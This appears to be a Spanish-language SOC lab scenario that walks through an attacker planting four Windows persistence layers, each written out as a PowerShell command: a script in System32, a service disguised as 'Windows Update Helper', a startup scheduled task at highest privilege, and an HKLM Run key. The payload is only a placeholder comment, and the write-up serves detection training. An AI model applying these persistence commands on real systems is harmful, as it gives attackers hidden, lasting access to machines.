# Escenario 05 — Persistencia / Backdoor
**Fecha:** 2026-06-18 | **Hora:** 20:00:00 | **Analista:** Katalina Sepúlveda López

## Contexto
El atacante sabe que puede ser descubierto. Instala 4 capas de persistencia para garantizar acceso aunque cambien contraseñas.

## 4 capas de persistencia instaladas

### CAPA 1 — Script malicioso en System32
```powershell
New-Item -Path "C:\Windows\System32\backdoor.ps1" `
         -ItemType File `
         -Value "# Backdoor simulado para lab SOC"
```

### CAPA 2 — Servicio falso (camuflado como servicio legítimo)
```powershell
New-Service -Name "WindowsUpdateHelper" `
            -BinaryPathName "C:\Windows\System32\backdoor.ps1" `
            -DisplayName "Windows Update Helper" `
            -StartupType Automatic `
            -Description "Servicio de actualizacion de Windows"
```
*El nombre "Windows Update Helper" imita servicios legítimos de Windows*

### CAPA 3 — Tarea programada de inicio automático
```powershell
$action  = New-ScheduledTaskAction -Execute "powershell.exe" `
           -Argument "-File C:\Windows\System32\backdoor.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "WindowsSecurityUpdate" `
                       -Action $action -Trigger $trigger `
                       -RunLevel Highest -Force
```

### CAPA 4 — Clave de registro Run (ejecución en cada login)
```powershell
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "SecurityHelper" `
                 -Value "C:\Windows\System32\backdoor.ps1" `
                 -PropertyType String -Force
```

## Verificación de las 4 capas instaladas
```powershell
Get-Service "WindowsUpdateHelper"
Get-ScheduledTask "WindowsSecurityUpdate"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Test-Path "C:\Windows\System32\backdoor.ps1"
```